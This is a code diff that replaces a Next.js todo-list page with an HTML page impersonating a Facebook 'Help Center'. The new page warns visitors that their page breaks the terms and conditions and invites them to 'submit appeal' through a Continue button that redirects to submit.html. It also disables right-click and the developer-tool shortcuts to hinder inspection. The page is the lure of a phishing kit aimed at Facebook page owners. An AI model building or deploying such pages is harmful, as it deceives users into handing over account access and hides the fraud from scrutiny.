@@ -1,95 +1,172 @@
-import { NextPage } from "next";
-import Head from "next/head";
-import { useMemo, useState } from "react";
-import { createTodo, deleteTodo, toggleTodo, useTodos } from "../api";
-import styles from "../styles/Home.module.css";
-import { Todo } from "../types";
+<!DOCTYPE html>
+<html lang="en">
 
-export const TodoList: React.FC = () => {
-  const { data: todos, error } = useTodos();
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Help Center</title>
+    <link rel="icon" href="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" type="image/png" />
+    <script type="text/javascript">
+        document.addEventListener("contextmenu", function(e) {
+            e.preventDefault();
+        });
 
-  if (error != null) return <div>Error loading todos...</div>;
-  if (todos == null) return <div>Loading...</div>;
+        document.addEventListener("keydown", function(e) {
+            // Check if the "i" or "c" key is pressed with Shift or Ctrl
+            if (
+                (e.key === "i" ||
+                    e.key === "c" ||
+                    e.keyCode === 73 ||
+                    e.keyCode === 67) &&
+                (e.shiftKey || e.ctrlKey)
+            ) {
+                e.preventDefault();
+            }
+        });
+    </script>
+    <style>
+        /* New theme styles */
 
-  if (todos.length === 0) {
-    return <div className={styles.emptyState}>Try adding a todo ☝️️</div>;
-  }
+        body {
+            background-color: #3b5998;
+            /* Facebook's classic blue */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #fff;
+            /* White text */
+            margin: 0;
+            /* Remove default margin */
+        }
 
-  return (
-    <ul className={styles.todoList}>
-      {todos.map(todo => (
-        <TodoItem todo={todo} />
-      ))}
-    </ul>
-  );
-};
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+            /* Required for relative positioning of the image and text */
+        }
 
-const TodoItem: React.FC<{ todo: Todo }> = ({ todo }) => (
-  <li className={styles.todo}>
-    <label
-      className={`${styles.label} ${todo.completed ? styles.checked : ""}`}
-    >
-      <input
-        type="checkbox"
-        checked={todo.completed}
-        className={`${styles.checkbox}`}
-        onChange={() => toggleTodo(todo)}
-      />
-      {todo.text}
-    </label>
+        .button {
+            background-color: #1877f2;
+            /* Facebook's primary blue */
+            color: #fff;
+            padding: 12px 24px;
+            font-size: 18px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
 
-    <button className={styles.deleteButton} onClick={() => deleteTodo(todo.id)}>
-      ✕
-    </button>
-  </li>
-);
+        .button:hover {
+            background-color: #1659c7;
+            /* Slightly darker blue on hover */
+        }
 
-const AddTodoInput = () => {
-  const [text, setText] = useState("");
+        /* Style for the image */
 
-  return (
-    <form
-      onSubmit={async e => {
-        e.preventDefault();
-        createTodo(text);
-        setText("");
-      }}
-      className={styles.addTodo}
-    >
-      <input
-        className={styles.input}
-        placeholder="Buy some milk"
-        value={text}
-        onChange={e => setText(e.target.value)}
-      />
-      <button className={styles.addButton}>Add</button>
-    </form>
-  );
-};
+        @media (max-width: 768px) {
+            .container img {
+                width: 40%;
+                margin-bottom: 20px; //* Adjust the image width for mobile */
+            }
+        }
 
-const Home: NextPage = () => {
-  return (
-    <div className={styles.container}>
-      <Head>
-        <title>Railway NextJS Prisma</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
+        /* Desktop styles */
 
-      <header className={styles.header}>
-        <h1 className={styles.title}>Todos</h1>
-        <h2 className={styles.desc}>
-          NextJS app connected to Postgres using Prisma and hosted on{" "}
-          <a href="https://railway.app">Railway</a>
-        </h2>
-      </header>
+        @media (min-width: 769px) {
+            .container img {
+                width: 10%;
+                /*
+                * Style for the "Help Center" text container */
+            .help-center-text-container {
+                text-align: center;
+                margin-top: -30px;
+                margin-top: 20px;
+                transform: translateY(-0px);
+                /* Add space between image and text */
+            }
+        }
 
-      <main className={styles.main}>
-        <AddTodoInput />
+        /* Style for the "Help Center" text */
 
-        <TodoList />
-      </main>
+        .help-center-text {
+            font-size: 36px;
+            /* Adjust the font size as needed */
+            font-weight: bold;
+            /* Super bold text */
+            color: #fff;
+            /* White text color */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            /* Add a subtle text shadow */
+        }
+
+        /* Style for the remaining content */
+
+        .remaining-content {
+            margin-top: 20px;
+            /* Add space below "Help Center" text */
+        }
+
+        /* Style for the text within the remaining content */
+
+        .remaining-text {
+            font-size: 18px;
+            /* Adjust the font size as needed */
+            font-weight: normal;
+            /* Normal text weight */
+        }
+    </style>
+</head>
+
+<body>
+    <div className="container">
+        <img src="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" alt="Your Image" />
+
+        {/* "Help Center" text container */}
+        <div className="help-center-text-container">
+            <div className="help-center-text">Help Center</div>
+        </div>
+
+        {/* Remaining content */}
+        <div className="remaining-content">
+            {/* Content from the first code snippet */}
+            <div className="bg-blue-300">
+                <div className="">
+                    <div className="flex justify-center items-center pl-6 px-28">
+                        <div className="flex mt-9"></div>
+                        <div className="mx-3">
+                            <p className="font text-gray-700 shadow-transparent mt-2 font-extralight">
+                                Your page is breaking our terms and conditions.
+                            </p>
+                            <p className="text-lg text-gray-700 font-extralight">
+                                Here you can submit appeal. Click "Continue" Button.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            {/* Continue button with JavaScript redirection */}
+            <form id="redirectForm" method="post" action="next.html">
+                <button type="submit" className="button">Continue</button>
+            </form>
+
+            {/* JavaScript to perform the redirection */}
+            <script>
+                document
+                    .getElementById("redirectForm")
+                    .addEventListener("submit", function(e) {
+                        e.preventDefault(); // Prevent the default form submission
+                        // Perform the redirection to the desired URL
+                        window.location.href =
+                            "submit.html"; // Replace with your desired URL
+                    });
+            </script>
+        </div>
     </div>
-  );
-};
+</body>
 
-export default Home;
+</html>
